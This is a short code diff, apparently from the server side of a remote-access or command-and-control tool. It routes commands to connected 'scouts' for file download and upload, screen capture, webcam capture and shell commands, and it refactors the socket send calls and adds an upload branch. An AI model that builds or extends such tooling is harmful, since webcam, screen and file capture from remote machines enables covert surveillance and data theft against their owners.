@@ -81,15 +81,15 @@ def main(scout_id, prompt=None):
                 else:
                     return jsonify({"output": "Success", "output_message": "Scout is alive", "data": ""})
             elif command == "download":
-                config.scout_database[scout_id][0].sendall(("g " + prompt).encode())
+                recv_all.main_send("g " + prompt, config.scout_database[scout_id][0])
                 output = download.main(config.scout_database[scout_id][0])
                 return output
             elif command == "screen":
-                config.scout_database[scout_id][0].sendall(("g " + prompt).encode())
+                recv_all.main_send("g " + prompt, config.scout_database[scout_id][0])
                 output = screen.main(config.scout_database[scout_id][0])
                 return output
             elif command == "webcam":
-                config.scout_database[scout_id][0].sendall(("g " + prompt).encode())
+                recv_all.main_send("g " + prompt, config.scout_database[scout_id][0])
                 output = webcam.main(config.scout_database[scout_id][0])
                 return output
             elif command == 'inj_valid':
@@ -99,6 +99,9 @@ def main(scout_id, prompt=None):
                 for i in formatted:
                     ret_string += '   ' + ''.join(i)
                 return jsonify({"output": "Success", "output_message": "Command Output", "data": ret_string})
+            elif command == "upload":
+                output = upload.main(scout_id, prompt)
+                return output
             else:
                 data = send_and_recv.main("g "+ prompt, scout_id)
                 if type(data) == str:
@@ -163,7 +166,7 @@ def main(scout_id, prompt=None):
                     config.scout_database[scout_id][0].sendall(("c "+ prompt).encode())
                     download.main(config.scout_database[scout_id][0])
                 elif command == 'upload':
-                    upload.main(config.scout_database[scout_id][0],"c "+ prompt)
+                    upload.main(scout_id, prompt)
                 elif command == 'screen':
                     config.scout_database[scout_id][0].sendall(("c "+ command).encode())
                     screen.main(config.scout_database[scout_id][0])
